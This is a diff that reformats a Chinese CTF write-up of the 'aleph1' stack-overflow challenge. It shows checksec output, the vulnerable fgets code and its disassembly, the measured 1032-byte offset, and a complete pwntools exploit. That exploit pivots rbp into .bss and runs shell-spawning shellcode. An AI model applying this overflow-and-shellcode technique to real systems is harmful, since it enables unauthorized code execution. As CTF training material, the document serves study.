@@ -15,41 +15,45 @@ tags:
 
 检查保护
 
-	root@kali:~# checksec aleph1
-	[*] '/root/aleph1'
-	    Arch:     amd64-64-little
-	    RELRO:    Partial RELRO
-	    Stack:    No canary found
-	    NX:       NX disabled
-	    PIE:      No PIE (0x400000)
-	    RWX:      Has RWX segments
-
+```python
+root@kali:~# checksec aleph1
+[*] '/root/aleph1'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x400000)
+    RWX:      Has RWX segments
+```
 
 没有开启任何保护，拖进IDA
 
 伪代码如下
 
-	int __cdecl main(int argc, const char **argv, const char **envp)
-	{
-	  char yolo[1024];  #[rsp+0h] [rbp-400h]
-	
-	  fgets(yolo, 1337, _bss_start);
-	  return 0;
-	}
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char yolo[1024];  #[rsp+0h] [rbp-400h]
 
+  fgets(yolo, 1337, _bss_start);
+  return 0;
+}
+```
 汇编代码如下
 
-	   0x4005ca <main>:	    push   rbp
-	   0x4005cb <main+1>:	mov    rbp,rsp
-	   0x4005ce <main+4>:	sub    rsp,0x400
-	   0x4005d5 <main+11>:	mov    rdx,QWORD PTR [rip+0x200a54] #0x601030<stdin@@GLIBC_2.2.5>
-	   0x4005dc <main+18>:	lea    rax,[rbp-0x400]
-	   0x4005e3 <main+25>:	mov    esi,0x539
-	   0x4005e8 <main+30>:	mov    rdi,rax
-	   0x4005eb <main+33>:	call   0x4004d0 <fgets@plt>
-	   0x4005f0 <main+38>:	mov    eax,0x0
-	   0x4005f5 <main+43>:	leave  
-	   0x4005f6 <main+44>:	ret    
+```nasm
+0x4005ca <main>:	    push   rbp
+0x4005cb <main+1>:	mov    rbp,rsp
+0x4005ce <main+4>:	sub    rsp,0x400
+0x4005d5 <main+11>:	mov    rdx,QWORD PTR [rip+0x200a54] #0x601030<stdin@@GLIBC_2.2.5>
+0x4005dc <main+18>:	lea    rax,[rbp-0x400]
+0x4005e3 <main+25>:	mov    esi,0x539
+0x4005e8 <main+30>:	mov    rdi,rax
+0x4005eb <main+33>:	call   0x4004d0 <fgets@plt>
+0x4005f0 <main+38>:	mov    eax,0x0
+0x4005f5 <main+43>:	leave  
+0x4005f6 <main+44>:	ret    
+```
 
 函数原型
 
@@ -65,8 +69,10 @@ tags:
 
 1.测得偏移为1032
 
-	gdb-peda$ pattern offset DAn;An)AnEAnaAn0AnFA
-	found at offset: 1032
+```python
+gdb-peda$ pattern offset DAn;An)AnEAnaAn0AnFA
+found at offset: 1032
+```
 
 2.覆盖rbp为`bss+0x400`，覆盖ret返回到`0x4005d5 <main+11>:  mov    rdx,QWORD PTR [rip+0x200a54]`
 
@@ -76,22 +82,23 @@ tags:
 
 ## 0x02 完整exp
 
-	from pwn import*
-	import pwnlib
-	context(os='linux', arch='amd64', log_level='debug')
-	e=ELF("./aleph1")
-	fgets_plt=e.plt['fgets']
-	bss_addr = e.bss()
-	shellcode=asm(shellcraft.sh())
-	shellcode+='A'*984
-	shellcode+=p64(bss_addr)
-	payload='a'*1024+p64(bss_addr+0x400)+p64(0x4005D5)
-	s=process("./aleph1")
-	s.sendline(payload)
-	#pwnlib.gdb.attach(s)
-	s.sendline(shellcode)
-	s.interactive()
-
+```python
+from pwn import*
+import pwnlib
+context(os='linux', arch='amd64', log_level='debug')
+e=ELF("./aleph1")
+fgets_plt=e.plt['fgets']
+bss_addr = e.bss()
+shellcode=asm(shellcraft.sh())
+shellcode+='A'*984
+shellcode+=p64(bss_addr)
+payload='a'*1024+p64(bss_addr+0x400)+p64(0x4005D5)
+s=process("./aleph1")
+s.sendline(payload)
+#pwnlib.gdb.attach(s)
+s.sendline(shellcode)
+s.interactive()
+```
 ## 0x03 运行结果
 
 ![pic1]
